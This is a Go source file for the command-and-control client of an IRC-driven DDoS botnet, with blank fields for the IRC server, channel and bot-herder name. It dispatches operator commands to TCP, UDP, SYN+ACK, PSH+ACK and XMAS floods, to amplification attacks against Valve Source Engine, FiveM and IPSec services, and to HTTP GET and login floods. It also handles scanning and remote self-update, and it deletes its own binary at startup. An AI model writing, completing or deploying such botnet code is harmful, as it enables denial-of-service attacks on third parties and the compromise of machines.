package main

import (
	"bufio"
	"fmt"
	"net/textproto"
	"os"
	"runtime"
	"strings"

	lib "bot/internal"
)

const (
	IRC_SERVER        = "" //config IRC server and port here. //ip:port //127.0.0.1:6667
	IRC_BACKUP_SERVER = "" //config like main server, if you didn't have it just leave it blank.
	IRC_CHANNEL       = "" //config channel here. //"#Example"
	IRC_CHANNEL_KEY   = "" //config channel key here, if you didn't have it just leave it blank.
	IRC_USERNAME      = "" //config your IRC username here, for access to your bot commands.
	IRC_BOT_TAG       = "" //config your bot tag. //[TAG][A][1234567]
)

type permission struct {
	reader string
}

func (p *permission) accessPerms() bool {
	return lib.Find(lib.Recv(p.reader, 0), IRC_USERNAME)
}

func run(server string) error {
	conn := lib.Conn(server)
	tp := textproto.NewReader(bufio.NewReader(conn))

	b := &lib.Bot{
		IRC:       conn,
		CPU:       runtime.NumCPU(),
		Channel:   IRC_CHANNEL,
		ChanKey:   IRC_CHANNEL_KEY,
		BotHerder: IRC_USERNAME,
		BotTag:    IRC_BOT_TAG,
	}
	b.Login()

	for {
		ircRead, err := tp.ReadLine()
		if err != nil {
			return err
		}

		p := &permission{
			reader: ircRead,
		}

		go func() {
			if lib.Find(ircRead, "PING :") {
				b.Send("PONG " + lib.Recv(ircRead, 1))
			}
		}()

		//check is user modes and join IRC channel
		if lib.Find(ircRead, "+i") || lib.Find(ircRead, "+w") || lib.Find(ircRead, "+x") {
			b.Send(fmt.Sprint("JOIN " + IRC_CHANNEL + IRC_CHANNEL_KEY))
		}

		go func() {
			if lib.Find(ircRead, "?tcp") && p.accessPerms() {
				/*
					TCP with custom Flags Flood
				*/
				lib.AttackSwitch = false
				go b.TCP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5), lib.Recv(ircRead, 6), lib.Recv(ircRead, 7), lib.Recv(ircRead, 8))
				b.Report("🗡 START TCP[" + strings.ToUpper(lib.CutWord(lib.Recv(ircRead, 4), "-")) + "] FLOOD ATTACKING: " + lib.Recv(ircRead, 6))
			} else if lib.Find(ircRead, "?udp") && p.accessPerms() {
				/*
					UDP Flood
				*/
				lib.AttackSwitch = false
				go b.UDP(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5), lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
				b.Report("🗡 START UDP FLOOD ATTACK: " + lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?saf") && p.accessPerms() {
				/*
					SYN+ACK Flags Flood
				*/
				lib.AttackSwitch = false
				go b.SAF(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5), lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
				b.Report("🗡 START SAF FLOOD ATTACK: " + lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?paf") && p.accessPerms() {
				/*
					PSH+ACK Flags Flood
				*/
				lib.AttackSwitch = false
				go b.PAF(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5), lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
				b.Report("🗡 START PAF FLOOD ATTACK: " + lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?xmas") && p.accessPerms() {
				/*
					XMAS Flood
				*/
				lib.AttackSwitch = false
				go b.XMAS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5), lib.Recv(ircRead, 6), lib.Recv(ircRead, 7))
				b.Report("🗡 START XMAS FLOOD ATTACK: " + lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?vse") && p.accessPerms() {
				/*
					Valve Source Engine Amplification
				*/
				lib.AttackSwitch = false
				go b.VSE(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
				b.Report("🗡 START VSE ATTACK: " + lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?fms") && p.accessPerms() {
				/*
					FiveM Server Amplification
				*/
				lib.AttackSwitch = false
				go b.FMS(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
				b.Report("🗡 START FMS ATTACK: " + lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?ipsec") && p.accessPerms() {
				/*
					IPSec Amplification
				*/
				lib.AttackSwitch = false
				go b.IPSEC(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
				b.Report("🗡 START IPSEC ATTACK: " + lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?get") && p.accessPerms() {
				/*
					HTTP get flood
				*/
				lib.AttackSwitch = false
				go b.GET(lib.Recv(ircRead, 4))
				b.Report("🗡 START GET FLOOD ATTACK: " + lib.Recv(ircRead, 4))
			} else if lib.Find(ircRead, "?poling") && p.accessPerms() {
				/*
					HTTP post login flood
				*/
				lib.AttackSwitch = false
				go b.POLING(lib.Recv(ircRead, 4))
				b.Report("🗡 START POLING FLOOD ATTACK: " + lib.Recv(ircRead, 4))
			} else if lib.Find(ircRead, "?scan") && p.accessPerms() {
				/*
					Bot scanner
				*/
				lib.ScanSwitch = false
				go b.Scanner(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?update") && p.accessPerms() {
				/*
					Bot self-update
				*/
				go b.Update(lib.Recv(ircRead, 4), lib.Recv(ircRead, 5))
			} else if lib.Find(ircRead, "?info") && p.accessPerms() {
				/*
					Bot infomation
				*/
				b.Information()
			} else if lib.Find(ircRead, "?kill") && p.accessPerms() {
				/*
					Bot self-close
				*/
				lib.Kill()
			} else if lib.Find(ircRead, "?stopddos") && p.accessPerms() {
				/*
					Stop DDoS attacking
				*/
				lib.ReportSwitch = true
				lib.AttackSwitch = true
			} else if lib.Find(ircRead, "?stopscan") && p.accessPerms() {
				/*
					Stop scanning
				*/
				lib.ScanSwitch = true
			}
		}()
	}
}

func main() {
	os.Remove(os.Args[0])
	if runtime.GOOS != "linux" {
		lib.Kill()
	}
	if run(IRC_SERVER) != nil {
		if IRC_BACKUP_SERVER == "" {
			lib.Kill()
		}
		for {
			if run(IRC_SERVER) == nil {
				break
			}
		}
	}
}
